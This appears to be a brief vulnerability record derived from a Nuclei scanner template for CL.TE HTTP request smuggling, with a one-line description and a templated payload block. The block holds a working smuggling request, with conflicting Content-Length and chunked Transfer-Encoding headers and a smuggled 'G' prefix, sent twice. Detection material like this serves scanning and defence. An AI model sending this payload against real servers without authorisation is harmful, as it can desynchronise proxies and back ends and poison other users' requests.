# Vulnerability: Basic CL.TE - HTTP request smuggling
**Classification:** CL-TE
**Source:** Nuclei Template (`cl-te-http-smuggling.yaml`)

## Description
Detected a potential CL.TE request smuggling condition where conflicting Content-Length and Transfer-Encoding headers caused the gateway and backend to parse requests differently.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

POST / HTTP/1.1
Host: {{Hostname}}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

